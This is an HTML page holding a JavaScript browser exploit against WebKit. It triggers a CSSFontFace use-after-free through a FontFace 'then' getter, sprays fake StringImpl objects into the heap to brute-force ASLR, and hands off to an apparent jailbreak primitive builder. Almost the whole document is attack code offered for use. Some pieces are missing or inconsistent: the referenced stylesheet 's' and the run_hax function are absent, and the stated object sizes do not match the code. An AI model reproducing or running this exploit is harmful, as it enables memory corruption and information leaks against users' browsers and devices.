<canvas id="c" width="512" height="128"></canvas>
<script>
"use strict";

// ============================================================
// "Old Method" Info Leak via StringImpl Overlap
// ============================================================

let spray = [];
let keep = [];
let uaf_strings = [];
const PAD = 0x22;
const FLUSH = 0x240;

function addPads() {
    const sheet = document.getElementById("s").sheet;
    for (let i = 0; i < PAD; i++)
        sheet.insertRule(`@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
    void document.body.offsetTop;
}

function addFlushRules() {
    const st = document.createElement("style");
    st.id = "flush";
    document.head.appendChild(st);
    const sheet = st.sheet;
    for (let i = 0; i < FLUSH; i++)
        sheet.insertRule(`@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
    void document.body.offsetTop;
}

function deleteFlushRules() {
    const sheet = document.getElementById("flush").sheet;
    while (sheet.cssRules.length)
        sheet.deleteRule(0);
    void document.body.offsetTop;
}

function killFontFaceSetCache() {
    const f = new FontFace("cachekill" + keep.length, "local(Helvetica)", { unicodeRange: "U+E124" });
    document.fonts.add(f);
    keep.push(f);
}

// Guessed Heap Address for our fake StringImpl spray (Brute force ASLR target)
const GUESSED_ADDR_LOW = 0x00000000;
const GUESSED_ADDR_HIGH = 0x00000004; // 0x400000000

// Target address we want to read if the exploit succeeds (e.g. some WebKit memory)
const TARGET_READ_LOW = 0x13371337;
const TARGET_READ_HIGH = 0x00000000;

let fake_string_spray = [];

function prepare_fake_strings() {
    // Phase 1: Spray ArrayBuffers filled with Fake StringImpl objects
    // This creates massive amounts of data in the heap that we hope lands at our GUESSED_ADDR
    alert("Spraying 2GB of Fake StringImpl objects for ASLR brute force...");
    for(let i = 0; i < 20000; i++) {
        let buffer = new Uint32Array(1024); // 4KB chunks
        for(let j = 0; j < buffer.length; j += 8) {
            // Fake StringImpl Header
            buffer[j+0] = 0x000000ff; // refCount = 255
            buffer[j+1] = 0x000000ff; // length = 255 (Safe length, no OOM!)
            buffer[j+2] = TARGET_READ_LOW;  // data pointer (what we want to read)
            buffer[j+3] = TARGET_READ_HIGH;
            buffer[j+4] = 0x80000014; // hashAndFlags (8-bit string)
            buffer[j+5] = 0x00000000;
        }
        fake_string_spray.push(buffer);
    }
}

// Create Strings of exactly 184 bytes (CSSFontFace size)
function makeStringImpl(index) {
    // 16-bit StringImpl header is ~20 bytes. 
    // We overwrite the entire CSSFontFace object.
    // We want the `m_family` pointer (offset ~0x18) to point to our GUESSED_ADDR.
    // UTF-16 encoding of 0x0000000400000000:
    // Low 32 bits: 0x00000000 -> \u0000\u0000
    // High 32 bits: 0x00000004 -> \u0000\u0004
    
    // We just fill the whole string with our guessed address pointer!
    let ptr_string = "\u0000\u0000\u0000\u0004"; 
    
    // Repeat to cover the whole object
    let base = ptr_string.repeat(17); 
    let unique = "ID" + index; 
    while(unique.length < 14) unique += "X"; 
    
    // Total chars = 68 + 14 = 82 (164 bytes)
    return base + unique;
}

async function stringimpl_overlap(dangling_face) {
    // Phase 2: The Promise has resolved.
    // If we didn't crash, it means WebKit read `m_family`, followed our guessed address 0x400000000,
    // found our Fake StringImpl, and created a Javascript String pointing to TARGET_READ!
    
    alert("PHASE 2 SURVIVED! Checking if we successfully leaked memory...");
    
    // One of the CSSFontFace properties exposed to JS will now contain the leaked memory
    // Unfortunately, we can't easily read `dangling_face.family` because the variable `dangling_face` 
    // was passed before the UAF, but we can check the global document fonts.
    
    let leaked_data = null;
    document.fonts.forEach(font => {
        if (font.family && font.family.length === 255) {
            leaked_data = font.family;
        }
    });

    if (leaked_data) {
        alert("HOLY SHIT IT WORKED! ASLR BYPASSED! First 4 chars: " + 
              leaked_data.charCodeAt(0).toString(16) + " " + 
              leaked_data.charCodeAt(1).toString(16));
              
        // The rest of the P2JB primitive builder goes here using the leak
        run_hax().catch(e => console.error("P2JB Error:", e));
    } else {
        alert("Failed. The browser read the guessed address, but it wasn't our fake string. Keep refreshing!");
    }
}

window.onload = () => {
    const trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
    document.fonts.add(trigger);
    void trigger.loaded;

    addPads();
    addFlushRules();

    let fired = false;
    Object.defineProperty(FontFace.prototype, "then", {
        configurable: true,
        get() {
            if (!fired && this === trigger) {
                fired = true;
                const sheet = document.getElementById("s").sheet;
                killFontFaceSetCache();
                
                sheet.deleteRule(1); // FREE CSSFontFace
                void document.body.offsetTop;
                deleteFlushRules();
                
                // SPRAY StringImpl to overlap the freed CSSFontFace
                for (let i = 0; i < 1000; i++) {
                    let str = makeStringImpl(i);
                    uaf_strings.push(str);
                }
            }
            return undefined;
        }
    });

    document.fonts.load("1em trigger, x", "AB").then(faces => {
        keep.push(faces);
        stringimpl_overlap(faces[0]);
    });
};
</script>
